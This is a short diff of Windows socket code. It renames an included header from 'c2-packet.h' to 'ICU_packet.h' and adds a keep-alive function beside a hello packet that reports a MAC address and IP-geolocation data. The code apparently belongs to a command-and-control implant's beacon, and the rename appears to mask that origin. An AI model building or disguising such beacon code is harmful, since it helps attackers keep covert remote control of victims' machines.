@@ -2,7 +2,8 @@
 #include <stdio.h>
 #include <string.h>
 #include <winsock2.h>
-#include "c2-packet.h"
+
+#include "ICU_packet.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -21,5 +22,12 @@ int hello_packet(SOCKET sock, const uint8_t* mac, const char* ipgeo_json) {
 
     int sent = send(sock, (const char*)buffer, (int)total_size, 0);
     free(buffer);
+    return sent;
+}
+
+int keep_alive(SOCKET sock) {
+    unsigned char keep_alive_packet = 0xAA;
+    size_t sent = send(sock, (const char*)&keep_alive_packet, sizeof(keep_alive_packet), 0);
+
     return sent;
 }
